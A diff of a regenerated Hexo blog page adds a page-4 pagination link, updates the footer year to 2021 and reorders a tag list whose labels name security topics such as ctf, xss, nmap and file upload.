     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
     </nav>
   
 
@@ -1003,7 +1061,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2020 cruoni
+    		&copy; 2021 cruoni
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -1086,10 +1144,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">bypass</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
@@ -1102,15 +1156,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">工具</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">nmap</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1122,15 +1180,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">xss</a>
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">渗透</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">bypass</a>
               </li>
              
               <li class="article-tag-list-item">
